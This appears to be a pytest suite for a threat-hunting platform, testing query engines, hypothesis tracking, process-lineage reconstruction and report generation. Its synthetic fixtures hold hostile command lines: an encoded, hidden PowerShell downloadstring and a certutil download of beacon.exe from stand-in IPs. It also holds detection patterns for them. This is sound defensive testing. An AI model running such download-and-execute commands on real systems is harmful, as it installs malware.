"""REDLOOP Phase 10 — Advanced Threat Hunting & Investigation Intelligence Test Suite.

Validates:
1. Structured Hunting Query Engine (hunting_query):
   - AST building and field criteria evaluation
   - Operators (EQ, NEQ, CONTAINS, NOT_CONTAINS, STARTSWITH, REGEX, IN, GT, LT)
   - Logical operators (AND, OR, NOT) and subqueries
   - Query cost and complexity estimation
   - Simple DSL parsing
   - Saved query book persistence and history
2. Threat-Hunting Hypothesis Management (hypothesis_manager):
   - Lifecycle state machine (DRAFT -> READY -> RUNNING -> SUPPORTED/REFUTED/CLOSED)
   - Dual-track evidence ledger: supporting vs contradictory
   - Non-fabrication & contradictory evidence weighing (lowers confidence score)
   - Linking queries, incidents, and cases
   - Auditable transition history
3. Attack Graph & Process Lineage Reconstruction (attack_reconstruction):
   - PID/PPID parent-child matching (DIRECTLY_OBSERVED)
   - Temporal host correlation (CORRELATED)
   - LOLBin detection (powershell, certutil, etc.)
   - Suspicious CLI pattern recognition (encoded commands, downloadstring)
   - Suspicious parent-child pairing detection (winword.exe -> powershell.exe)
4. Multi-Hop Pivot Engine (hunting_pivots):
   - Multi-hop traversal (IP -> Host -> Incident -> Case)
   - Cycle detection and bounded depth exploration
   - Edge provenance preservation
5. Structured Investigation Reports Generator (investigation_reports):
   - Case investigation report generation
   - Telemetry threat hunt report generation
   - Factual separation: Confirmed observations vs Inferences
   - Comprehensive GitHub-flavored Markdown rendering
6. Copilot Investigation Operational Intents (soc_copilot):
   - hunt_powershell, lineage_analysis, multi_location_auth, investigate_hash,
     build_timeline, find_contradictions, check_unqueried_sources, recommend_next_hunt,
     generate_investigation_report
7. Phase 10 REST API Endpoints (workbench):
   - Query execution, saved queries, hypotheses, process trees, pivots, reports
"""

from __future__ import annotations

import json
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from redloop.assessment.attack_reconstruction import (
    AttackReconstructionEngine,
    LineageEdgeType,
    ProcessLineageGraph,
)
from redloop.assessment.case_management import CaseManager, CasePriority, CaseSeverity
from redloop.assessment.hunting_pivots import (
    PivotEntityType,
    ThreatHuntingPivotEngine,
)
from redloop.assessment.hunting_query import (
    HuntingLogicalOperator,
    HuntingOperator,
    HuntingQueryAST,
    HuntingQueryEngine,
    QueryFieldCriteria,
    estimate_query_cost,
)
from redloop.assessment.hypothesis_manager import (
    HypothesisManager,
    HypothesisStatus,
)
from redloop.assessment.investigation_reports import (
    InvestigationReportGenerator,
)
from redloop.assessment.soc_copilot import SOCCopilotEngine
from redloop.assessment.soc_events import (
    EventCategory,
    EventSeverity,
    ParserStatus,
    UniversalSecurityEvent,
)
from redloop.unified_app import get_app


@pytest.fixture
def test_events():
    now_iso = datetime.now(timezone.utc).isoformat()
    return [
        UniversalSecurityEvent(
            event_id="EVT-101",
            timestamp=now_iso,
            source_type="sysmon",
            hostname="WS-FINANCE-01",
            username="analyst_alice",
            source_ip="192.168.1.100",
            destination_ip="203.0.113.55",
            event_category=EventCategory.PROCESS,
            event_action="process_create",
            process_name="winword.exe",
            process_id="1001",
            parent_process_id="500",
            command_line="winword.exe C:\\Users\\Alice\\Invoice.docx",
            file_hash="aaa111bbb222",
            severity=EventSeverity.LOW,
            parser_status=ParserStatus.NORMALIZED,
        ),
        UniversalSecurityEvent(
            event_id="EVT-102",
            timestamp=now_iso,
            source_type="sysmon",
            hostname="WS-FINANCE-01",
            username="analyst_alice",
            source_ip="192.168.1.100",
            destination_ip="203.0.113.55",
            event_category=EventCategory.PROCESS,
            event_action="process_create",
            process_name="powershell.exe",
            process_id="1002",
            parent_process_id="1001",
            parent_process_name="winword.exe",
            command_line="powershell.exe -enc SQBFAFgA -w hidden downloadstring('http://203.0.113.55/payload.ps1')",
            file_hash="ccc333ddd444",
            severity=EventSeverity.CRITICAL,
            parser_status=ParserStatus.NORMALIZED,
        ),
        UniversalSecurityEvent(
            event_id="EVT-103",
            timestamp=now_iso,
            source_type="edr_defender",
            hostname="WS-FINANCE-01",
            username="SYSTEM",
            source_ip="192.168.1.100",
            destination_ip="203.0.113.88",
            event_category=EventCategory.PROCESS,
            event_action="process_create",
            process_name="certutil.exe",
            process_id="1003",
            parent_process_id="1002",
            parent_process_name="powershell.exe",
            command_line="certutil.exe -urlcache -split -f http://203.0.113.88/beacon.exe C:\\Temp\\beacon.exe",
            file_hash="eee555fff666",
            severity=EventSeverity.HIGH,
            parser_status=ParserStatus.NORMALIZED,
        ),
        UniversalSecurityEvent(
            event_id="EVT-104",
            timestamp=now_iso,
            source_type="linux_auth",
            hostname="SRV-LINUX-01",
            username="bob",
            source_ip="198.51.100.10",
            event_action="ssh_login",
            severity=EventSeverity.MEDIUM,
            parser_status=ParserStatus.NORMALIZED,
        ),
        UniversalSecurityEvent(
            event_id="EVT-105",
            timestamp=now_iso,
            source_type="linux_auth",
            hostname="SRV-LINUX-01",
            username="bob",
            source_ip="203.0.113.99",
            event_action="ssh_login",
            severity=EventSeverity.HIGH,
            parser_status=ParserStatus.NORMALIZED,
        ),
    ]


# ==============================================================================
# 1. STRUCTURED HUNTING QUERY TESTS
# ==============================================================================

class TestStructuredHuntingQuery:
    def test_query_ast_matching(self, test_events):
        ast = HuntingQueryAST(
            criteria=[
                QueryFieldCriteria(field_name="process_name", operator=HuntingOperator.EQ, value="powershell.exe"),
                QueryFieldCriteria(field_name="command_line", operator=HuntingOperator.CONTAINS, value="-enc"),
            ]
        )
        engine = HuntingQueryEngine.get_instance()
        res = engine.execute_query(ast, events=test_events)
        assert res.total_matched == 1
        assert res.matched_events[0].event_id == "EVT-102"

    def test_regex_and_in_operators(self, test_events):
        ast_regex = HuntingQueryAST(
            criteria=[
                QueryFieldCriteria(field_name="command_line", operator=HuntingOperator.REGEX, value=r"downloadstring|urlcache"),
            ]
        )
        engine = HuntingQueryEngine.get_instance()
        res = engine.execute_query(ast_regex, events=test_events)
        assert res.total_matched == 2  # EVT-102 and EVT-103

        ast_in = HuntingQueryAST(
            criteria=[
                QueryFieldCriteria(field_name="process_name", operator=HuntingOperator.IN, value=["powershell.exe", "certutil.exe"]),
            ]
        )
        res_in = engine.execute_query(ast_in, events=test_events)
        assert res_in.total_matched == 2

    def test_dsl_parsing(self, test_events):
        engine = HuntingQueryEngine.get_instance()
        dsl = 'process_name == "winword.exe" AND hostname == "WS-FINANCE-01"'
        res = engine.execute_query(dsl, events=test_events)
        assert res.total_matched == 1
        assert res.matched_events[0].event_id == "EVT-101"

    def test_cost_estimator(self):
        ast_simple = HuntingQueryAST(
            criteria=[QueryFieldCriteria(field_name="process_name", operator=HuntingOperator.EQ, value="cmd.exe")],
            time_start="2026-11-01T00:00:00Z",
            time_end="2026-11-02T00:00:00Z",
        )
        cost_s, rating_s = estimate_query_cost(ast_simple)
        assert rating_s == "LOW"

        ast_heavy = HuntingQueryAST(
            criteria=[
                QueryFieldCriteria(field_name="command_line", operator=HuntingOperator.REGEX, value=r"[a-z0-9+/=]{50,}"),
                QueryFieldCriteria(field_name="command_line", operator=HuntingOperator.REGEX, value=r"bypass.*hidden"),
            ],
            limit=900,
        )
        cost_h, rating_h = estimate_query_cost(ast_heavy)
        assert cost_h > cost_s
        assert rating_h in ("MEDIUM", "HIGH")

    def test_saved_queries_crud(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "test_queries.db"
            engine = HuntingQueryEngine(db_path=db_path)

            saved = engine.save_query(
                title="LOLBin Execution Hunt",
                query_ast={"criteria": [{"field_name": "process_name", "operator": "EQ", "value": "powershell.exe"}]},
                description="Hunts for PowerShell",
                mitre_techniques=["T1059.001"],
            )
            assert saved["query_id"].startswith("sq-")

            queries = engine.list_saved_queries()
            assert len(queries) == 1
            assert queries[0]["title"] == "LOLBin Execution Hunt"

            deleted = engine.delete_saved_query(saved["query_id"])
            assert deleted is True
            assert len(engine.list_saved_queries()) == 0


# ==============================================================================
# 2. THREAT HUNTING HYPOTHESIS TESTS
# ==============================================================================

class TestThreatHuntingHypotheses:
    def test_hypothesis_lifecycle_and_evidence(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "test_hypotheses.db"
            mgr = HypothesisManager(db_path=db_path)

            hyp = mgr.create_hypothesis(
                title="Phishing via Malicious Macro",
                description="Adversary distributed weaponized Office doc executing PowerShell.",
                mitre_techniques=["T1566.001", "T1059.001"],
                expected_evidence=["Office process spawning PowerShell", "Outbound beaconing to external IP"],
                lead_hunter="alice",
            )
            assert hyp.hypothesis_id.startswith("hyp-")
            assert hyp.status == HypothesisStatus.DRAFT
            assert hyp.confidence_score == 0.5

            # Transition to RUNNING
            running_hyp = mgr.update_status(hyp.hypothesis_id, HypothesisStatus.RUNNING)
            assert running_hyp.status == HypothesisStatus.RUNNING

            # Add Supporting Evidence
            supp_hyp = mgr.add_evidence(
                hypothesis_id=hyp.hypothesis_id,
                description="Observed winword.exe spawning powershell.exe with hidden window",
                source_type="sysmon",
                source_reference="EVT-102",
                is_contradictory=False,
                weight=2.0,
            )
            assert len(supp_hyp.supporting_evidence) == 1
            assert supp_hyp.confidence_score > 0.5

            # Add Contradictory Evidence (e.g. IT confirmed approved administrative script)
            contra_hyp = mgr.add_evidence(
                hypothesis_id=hyp.hypothesis_id,
                description="User verified authorized scheduled macro report generation",
                source_type="interview",
                source_reference="IT-TICKET-440",
                is_contradictory=True,
                weight=1.5,
            )
            assert len(contra_hyp.contradictory_evidence) == 1
            # Contradictory evidence lowers confidence score!
            assert contra_hyp.confidence_score < supp_hyp.confidence_score

            # Close hypothesis
            closed_hyp = mgr.update_status(
                hypothesis_id=hyp.hypothesis_id,
                new_status=HypothesisStatus.REFUTED,
                findings_summary="Refuted: execution verified as legitimate IT macro workflow.",
            )
            assert closed_hyp.status == HypothesisStatus.REFUTED

            # Verify audit trail
            audit = mgr.get_audit_trail(hyp.hypothesis_id)
            assert len(audit) >= 4


# ==============================================================================
# 3. ATTACK RECONSTRUCTION & PROCESS LINEAGE TESTS
# ==============================================================================

class TestAttackReconstruction:
    def test_process_tree_and_anomaly_detection(self, test_events):
        graph = AttackReconstructionEngine.reconstruct_process_lineage(test_events)
        assert isinstance(graph, ProcessLineageGraph)
        assert len(graph.nodes) == 3  # EVT-101 (winword), EVT-102 (powershell), EVT-103 (certutil)
        assert len(graph.edges) == 2  # winword -> powershell -> certutil

        # winword -> powershell is PID/PPID DIRECTLY_OBSERVED
        edge1 = graph.edges[0]
        assert edge1.edge_type == LineageEdgeType.DIRECTLY_OBSERVED

        # Check anomalies
        p_node = next(n for n in graph.nodes if n.process_name == "powershell.exe")
        assert p_node.is_lolbin is True
        assert p_node.is_suspicious is True
        assert any("winword.exe" in ind for ind in p_node.suspicious_indicators)
        assert any("Encoded" in ind or "Remote" in ind for ind in p_node.suspicious_indicators)

        # Check ATT&CK mapping
        assert "T1059 (Command and Scripting Interpreter)" in graph.attack_techniques_detected


# ==============================================================================
# 4. MULTI-HOP PIVOT TESTS
# ==============================================================================

class TestMultiHopPivot:
    def test_pivot_traversal_depth(self, test_events):
        res = ThreatHuntingPivotEngine.execute_pivot(
            entity_type=PivotEntityType.HOST,
            entity_value="WS-FINANCE-01",
            events=test_events,
            max_depth=3,
        )
        assert res.root_entity_value == "WS-FINANCE-01"
        assert res.total_entities_discovered >= 3
        assert "IP" in res.entities
        assert "192.168.1.100" in res.entities["IP"]
        assert "USER" in res.entities
        assert "analyst_alice" in res.entities["USER"]
        assert len(res.hops) >= 2


# ==============================================================================
# 5. INVESTIGATION REPORTS GENERATOR TESTS
# ==============================================================================

class TestInvestigationReports:
    def test_case_investigation_report_generation(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "cases_report.db"
            cm = CaseManager(db_path=db_path)
            case = cm.create_case(
                title="Lateral Movement Outbreak",
                description="Investigation of lateral movement via PsExec.",
                severity=CaseSeverity.CRITICAL,
                priority=CasePriority.P1,
                assigned_to="alice",
            )
            cm.add_note(case.case_id, author="alice", content="Identified suspicious named pipe.")

            rep = InvestigationReportGenerator.generate_case_report(case.case_id, author="lead_alice", case_mgr=cm)
            assert rep.title == "Lateral Movement Outbreak"
            assert rep.author == "lead_alice"
            assert len(rep.confirmed_observations) >= 2
            assert len(rep.timeline_events) >= 2

            md = rep.to_markdown()
            assert "# REDLOOP Threat Investigation Report" in md
            assert "## 1. Executive Summary" in md
            assert "## 2. Confirmed Observations vs Inferences" in md
            assert "## 6. Incident Timeline" in md

    def test_custom_hunt_report_generation(self, test_events):
        rep = InvestigationReportGenerator.generate_custom_hunt_report(
            title="Macro to PowerShell Campaign Hunt",
            events=test_events,
            seed_entity=("HOST", "WS-FINANCE-01"),
        )
        assert rep.title == "Macro to PowerShell Campaign Hunt"
        assert rep.attack_reconstruction is not None
        assert rep.attack_reconstruction["suspicious_nodes_count"] >= 2
        md = rep.to_markdown()
        assert "powershell.exe" in md
        assert "winword.exe" in md


# ==============================================================================
# 6. COPILOT INVESTIGATION INTENTS TESTS
# ==============================================================================

class TestCopilotInvestigationIntents:
    def test_copilot_hunt_powershell(self, test_events):
        res = SOCCopilotEngine.handle_operational_query(
            user_query="Hunt for suspicious powershell execution",
            context={"events": test_events},
        )
        assert res["intent"] == "hunt_powershell"
        assert res["status"] == "COMPLETED"
        assert res["matched_count"] >= 1

    def test_copilot_lineage_analysis(self, test_events):
        res = SOCCopilotEngine.handle_operational_query(
            user_query="Reconstruct process lineage for host WS-FINANCE-01",
            context={"events": test_events, "host": "WS-FINANCE-01"},
        )
        assert res["intent"] == "lineage_analysis"
        assert res["status"] == "COMPLETED"
        assert res["total_nodes"] == 3
        assert res["suspicious_nodes_count"] >= 1

    def test_copilot_multi_location_auth(self, test_events):
        res = SOCCopilotEngine.handle_operational_query(
            user_query="Hunt for multi-location logins or impossible travel",
            context={"events": test_events},
        )
        assert res["intent"] == "multi_location_auth"
        assert res["status"] == "COMPLETED"
        assert res["anomalous_users_count"] == 1  # bob logged in from two IPs

    def test_copilot_investigate_hash(self, test_events):
        res = SOCCopilotEngine.handle_operational_query(
            user_query="Investigate hash ccc333ddd444",
            context={"events": test_events},
        )
        assert res["intent"] == "investigate_hash"
        assert res["status"] == "COMPLETED"
        assert res["total_entities_discovered"] >= 1

    def test_copilot_contradictions_and_recommend_next_hunt(self):
        res_contra = SOCCopilotEngine.handle_operational_query(user_query="Find contradictions across hypotheses")
        assert res_contra["intent"] == "find_contradictions"
        assert res_contra["status"] == "COMPLETED"

        res_next = SOCCopilotEngine.handle_operational_query(user_query="Recommend next threat hunt")
        assert res_next["intent"] == "recommend_next_hunt"
        assert res_next["status"] == "COMPLETED"
        assert "recommended_hunt" in res_next


# ==============================================================================
# 7. WORKBENCH REST APIS TESTS
# ==============================================================================

class TestWorkbenchHuntingAPIs:
    @pytest.fixture
    def client(self):
        app = get_app()
        return TestClient(app)

    def test_api_execute_query(self, client: TestClient, test_events):
        events_dicts = [e.to_dict() for e in test_events]
        payload = {
            "query": 'process_name == "powershell.exe"',
            "events": events_dicts,
        }
        resp = client.post("/api/hunting/query", json=payload, headers={"Origin": "http://testserver"})
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert data["result"]["total_matched"] == 1

    def test_api_saved_queries(self, client: TestClient):
        payload = {
            "title": "API Saved Query",
            "description": "Test query",
            "query_ast": {"criteria": [{"field_name": "process_name", "operator": "EQ", "value": "pwsh.exe"}]},
            "mitre_techniques": ["T1059"],
        }
        resp = client.post("/api/hunting/queries/saved", json=payload, headers={"Origin": "http://testserver"})
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        qid = data["saved_query"]["query_id"]

        list_resp = client.get("/api/hunting/queries/saved", headers={"Origin": "http://testserver"})
        assert list_resp.status_code == 200
        assert any(q["query_id"] == qid for q in list_resp.json()["queries"])

        del_resp = client.delete(f"/api/hunting/queries/saved/{qid}", headers={"Origin": "http://testserver"})
        assert del_resp.status_code == 200

    def test_api_hypotheses_and_evidence(self, client: TestClient):
        h_payload = {
            "title": "API Hypothesis",
            "description": "Adversary abusing certutil",
            "mitre_techniques": ["T1105"],
            "expected_evidence": ["certutil network connection"],
        }
        resp = client.post("/api/hunting/hypotheses", json=h_payload, headers={"Origin": "http://testserver"})
        assert resp.status_code == 200
        hid = resp.json()["hypothesis"]["hypothesis_id"]

        # Add evidence
        ev_payload = {
            "description": "Observed certutil.exe -urlcache network connection to external IP",
            "source_type": "edr",
            "source_reference": "EVT-103",
            "is_contradictory": False,
            "weight": 1.5,
        }
        ev_resp = client.post(f"/api/hunting/hypotheses/{hid}/evidence", json=ev_payload, headers={"Origin": "http://testserver"})
        assert ev_resp.status_code == 200
        assert len(ev_resp.json()["hypothesis"]["supporting_evidence"]) == 1

    def test_api_reconstruct_process_tree(self, client: TestClient, test_events):
        events_dicts = [e.to_dict() for e in test_events]
        resp = client.post(
            "/api/hunting/reconstruction/process-tree",
            json={"events": events_dicts, "focus_host": "WS-FINANCE-01"},
            headers={"Origin": "http://testserver"},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert len(data["graph"]["nodes"]) == 3

    def test_api_generate_report(self, client: TestClient, test_events):
        events_dicts = [e.to_dict() for e in test_events]
        resp = client.post(
            "/api/investigations/reports/generate",
            json={"title": "Automated Hunt Report", "events": events_dicts},
            headers={"Origin": "http://testserver"},
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["success"] is True
        assert "markdown" in data
        assert "# REDLOOP Threat Investigation Report" in data["markdown"]
